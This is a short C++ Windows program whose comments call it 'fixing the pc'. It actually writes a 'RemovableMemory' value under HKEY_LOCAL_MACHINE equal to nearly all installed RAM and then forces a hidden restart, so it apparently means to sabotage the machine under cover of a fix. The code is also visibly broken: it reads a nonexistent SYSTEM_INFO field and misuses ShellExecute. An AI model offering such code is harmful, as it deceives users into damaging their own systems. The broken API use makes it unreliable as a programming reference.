#include <iostream>
#include <string>
#include <sstream>
#include <windows.h>
#include <shellapi.h>

int main() {
    
    DWORD totalRam = 0;
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    totalRam = si.totalPhys / 1024 / 1024; //mb fosho

    
    int memoryToRemove = totalRam - 28;

    //fixing the pc
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Hardware Profiles\\Current"), 0, KEY_ALL_ACCESS, &hKey);//if the genie were to grant me another wish out of pitty, i would again ask for another pack of newports
    if (result == ERROR_SUCCESS) {
        result = RegSetValueEx(hKey, TEXT("RemovableMemory"), 0, REG_DWORD, (LPBYTE)&memoryToRemove, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    //making it remember...
    
    ShellExecute(NULL, "shutdown", "/r", NULL, NULL, SW_HIDE);

    return 0; //returning to unhook memory or wont set #registarded
}
